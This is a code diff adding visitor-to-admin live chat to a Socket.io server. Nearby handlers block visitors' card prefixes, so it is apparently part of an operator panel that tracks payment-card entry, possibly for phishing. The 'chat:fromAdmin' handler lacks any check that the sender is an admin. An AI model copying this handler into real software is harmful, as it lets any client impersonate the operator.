@@ -849,6 +849,80 @@ io.on("connection", (socket) => {
     console.log(`Visitor ${visitorId} marked as read`);
   });
 
+  // Chat: Message from visitor to admin
+  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
+    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
+    if (visitor) {
+      // Initialize chat messages array if not exists
+      if (!visitor.chatMessages) {
+        visitor.chatMessages = [];
+      }
+      
+      // Add message to visitor's chat history
+      const chatMessage = {
+        id: Date.now().toString(),
+        text: message,
+        sender: 'visitor',
+        timestamp: timestamp || new Date().toISOString()
+      };
+      visitor.chatMessages.push(chatMessage);
+      visitor.hasNewMessage = true;
+      visitors.set(visitor.socketId, visitor);
+      saveVisitorPermanently(visitor);
+      
+      // Notify all admins about the new message
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("chat:newMessage", {
+          visitorSocketId: visitor.socketId,
+          visitorId: visitor._id,
+          message: chatMessage
+        });
+      });
+      
+      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
+    }
+  });
+
+  // Chat: Message from admin to visitor
+  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      // Initialize chat messages array if not exists
+      if (!visitor.chatMessages) {
+        visitor.chatMessages = [];
+      }
+      
+      // Add message to visitor's chat history
+      const chatMessage = {
+        id: Date.now().toString(),
+        text: message,
+        sender: 'admin',
+        timestamp: timestamp || new Date().toISOString()
+      };
+      visitor.chatMessages.push(chatMessage);
+      visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
+      
+      // Send message to visitor
+      io.to(visitorSocketId).emit("chat:fromAdmin", {
+        message: message,
+        timestamp: chatMessage.timestamp
+      });
+      
+      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
+    }
+  });
+
+  // Chat: Mark messages as read
+  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.hasNewMessage = false;
+      visitors.set(visitorSocketId, visitor);
+      saveVisitorPermanently(visitor);
+    }
+  });
+
   // Admin: Block card prefix
   socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
     const visitor = visitors.get(visitorSocketId);
